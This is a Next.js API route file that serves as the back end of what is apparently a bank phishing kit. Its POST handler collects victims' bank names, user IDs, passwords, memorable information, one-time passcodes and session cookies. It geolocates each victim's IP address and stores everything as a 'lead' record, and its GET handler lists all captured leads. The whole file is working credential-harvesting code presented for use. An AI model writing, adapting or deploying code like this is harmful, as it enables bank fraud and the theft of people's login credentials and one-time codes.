import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const leads = await prisma.lead.findMany({
      orderBy: { createdAt: "desc" },
    });
    return NextResponse.json({ success: true, data: leads });
  } catch (error) {
    console.error("GET Leads Error:", error);
    return NextResponse.json({ success: false, data: [] }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => ({}));
    const { sessionId, bank, bankName, bankType, userId, password, memorableInfo, otpCode, extraData, cookiesData, ipAddress, deviceInfo } = body;

    const forwardedFor = req.headers.get("x-forwarded-for");
    const realIp = req.headers.get("x-real-ip");
    const cfIp = req.headers.get("cf-connecting-ip");

    let rawIp = ipAddress || forwardedFor || realIp || cfIp || "39.34.173.81";
    if (typeof rawIp === "string" && rawIp.includes(",")) {
      rawIp = rawIp.split(",")[0].trim();
    }
    const clientIp = rawIp;

    let country = "United Kingdom";
    let city = "London";
    let isp = "Secure UK Node";

    try {
      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,query`, {
        signal: AbortSignal.timeout(2000)
      });
      if (geoRes.ok) {
        const data = await geoRes.json();
        if (data && data.status === "success") {
          country = data.country || "United Kingdom";
          city = data.city || "London";
          isp = data.isp || "ISP";
        }
      }
    } catch (e) {
      console.log("Geo lookup fallback active");
    }

    const leadPayload = {
      bank: bank || bankName || "Target Portal",
      bankName: bankName || bank || "Target Portal",
      bankType: bankType || "Personal",
      userId: userId || "",
      password: password || "",
      memorableInfo: memorableInfo || "",
      extraData: extraData || `Location: ${city}, ${country}`,
      cookiesData: cookiesData || JSON.stringify({ browser: "active_session", timestamp: Date.now() }),
      otpCode: otpCode || "",
      ipAddress: clientIp,
      deviceInfo: deviceInfo || `${country} | Browser Node`,
    };

    let lead;
    if (sessionId) {
      lead = await prisma.lead.upsert({
        where: { sessionId },
        update: leadPayload,
        create: { sessionId, ...leadPayload },
      });
    } else {
      lead = await prisma.lead.create({ data: leadPayload });
    }

    return NextResponse.json({ success: true, id: lead.id, data: lead });
  } catch (error) {
    console.error("POST Lead Error:", error);
    return NextResponse.json({ success: false, error: "Failed to save lead" }, { status: 500 });
  }
}